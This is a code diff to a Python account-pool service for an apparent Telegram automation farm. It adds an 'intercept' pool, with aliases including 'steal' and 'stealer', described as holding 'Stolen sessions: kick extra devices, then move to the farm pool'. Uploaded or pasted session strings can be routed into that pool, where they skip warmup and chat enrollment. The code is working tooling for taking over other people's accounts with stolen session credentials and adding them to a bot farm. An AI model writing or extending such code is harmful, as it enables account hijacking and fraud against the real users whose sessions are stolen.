@@ -17,6 +17,16 @@ from sqlalchemy.ext.asyncio import AsyncSession
 from ..alembic.models import AccountPool, CustomAutomation, PoolAccount, SocialAccount
 from ..config import settings
 
+POOL_FARM = "farm"
+POOL_INTERCEPT = "intercept"
+
+
+def normalize_pool_purpose(raw: Any) -> str:
+    value = str(raw or POOL_FARM).strip().lower()
+    if value in {POOL_INTERCEPT, "steal", "stealer", "перехват"}:
+        return POOL_INTERCEPT
+    return POOL_FARM
+
 
 _SQLITE_MAGIC = b"SQLite format 3\x00"
 
@@ -102,6 +112,7 @@ async def get_or_create_default_pool(session: AsyncSession, automation_id: int) 
         custom_automation_id=automation_id,
         name="Default",
         description="Default pool created automatically",
+        purpose=POOL_FARM,
         is_default=True,
         created_at=_utc_now(),
         updated_at=_utc_now(),
@@ -110,6 +121,41 @@ async def get_or_create_default_pool(session: AsyncSession, automation_id: int) 
     await session.flush()
     await session.refresh(pool)
     return pool
+
+
+async def get_or_create_intercept_pool(session: AsyncSession, automation_id: int) -> AccountPool:
+    pool = await session.scalar(
+        select(AccountPool).where(
+            AccountPool.custom_automation_id == automation_id,
+            AccountPool.purpose == POOL_INTERCEPT,
+        )
+    )
+    if pool:
+        return pool
+
+    pool = AccountPool(
+        custom_automation_id=automation_id,
+        name="Intercept",
+        description="Stolen sessions: kick extra devices, then move to the farm pool",
+        purpose=POOL_INTERCEPT,
+        is_default=False,
+        created_at=_utc_now(),
+        updated_at=_utc_now(),
+    )
+    session.add(pool)
+    await session.flush()
+    await session.refresh(pool)
+    return pool
+
+
+async def get_or_create_pool(
+    session: AsyncSession,
+    automation_id: int,
+    purpose: str | None = POOL_FARM,
+) -> AccountPool:
+    if normalize_pool_purpose(purpose) == POOL_INTERCEPT:
+        return await get_or_create_intercept_pool(session, automation_id)
+    return await get_or_create_default_pool(session, automation_id)
 
 
 async def _create_social_account(
@@ -126,6 +172,8 @@ async def _create_social_account(
     preferred_proxy_id: int | None = None,
     lock_preferred: bool = True,
 ) -> SocialAccount:
+    pool_row = await session.get(AccountPool, pool_id)
+    origin = POOL_INTERCEPT if getattr(pool_row, "purpose", POOL_FARM) == POOL_INTERCEPT else POOL_FARM
     social_account = SocialAccount(
         provider=provider,
         phone_number=phone_number,
@@ -133,6 +181,7 @@ async def _create_social_account(
         display_name=display_name,
         encrypted_session=encrypted_session,
         session_file_path=session_file_path,
+        origin=origin,
         created_at=_utc_now(),
         updated_at=_utc_now(),
     )
@@ -152,7 +201,8 @@ async def _create_social_account(
     from .custom.account_warmup_service import enroll_pool_account
     from .custom.proxy_service import assign_proxy_to_new_account
 
-    enroll_pool_account(automation, pool_account)
+    if origin != POOL_INTERCEPT:
+        enroll_pool_account(automation, pool_account)
     await assign_proxy_to_new_account(
         session,
         pool_account,
@@ -160,9 +210,10 @@ async def _create_social_account(
         preferred_proxy_id=preferred_proxy_id,
         lock_preferred=lock_preferred,
     )
-    from .custom.chat_membership_service import ensure_memberships_for_account
+    if origin != POOL_INTERCEPT:
+        from .custom.chat_membership_service import ensure_memberships_for_account
 
-    await ensure_memberships_for_account(session, automation_id, social_account.id)
+        await ensure_memberships_for_account(session, automation_id, social_account.id)
     return social_account
 
 
@@ -274,10 +325,11 @@ async def add_account_from_session_string(
     telegram_id: int | None = None,
     preferred_proxy_id: int | None = None,
     lock_preferred: bool = True,
+    pool_purpose: str | None = POOL_FARM,
 ) -> tuple[PoolAccount, SocialAccount]:
     """Persist an authorized StringSession as a pool .session account."""
     data = await asyncio.to_thread(string_session_to_sqlite_bytes, session_string)
-    pool = await get_or_create_default_pool(session, automation_id)
+    pool = await get_or_create_pool(session, automation_id, pool_purpose)
     existing = await _find_existing_pool_account(
         session,
         automation_id,
@@ -356,9 +408,10 @@ async def bulk_upload_sessions(
     upload_file: UploadFile,
     *,
     preferred_proxy_id: int | None = None,
+    pool_purpose: str | None = POOL_FARM,
 ) -> dict[str, Any]:
     """Accept .zip, .csv or a single .session file and create SocialAccount/PoolAccount records."""
-    pool = await get_or_create_default_pool(session, automation_id)
+    pool = await get_or_create_pool(session, automation_id, pool_purpose)
 
     filename = (upload_file.filename or "upload").lower()
     content_type = (upload_file.content_type or "").lower()
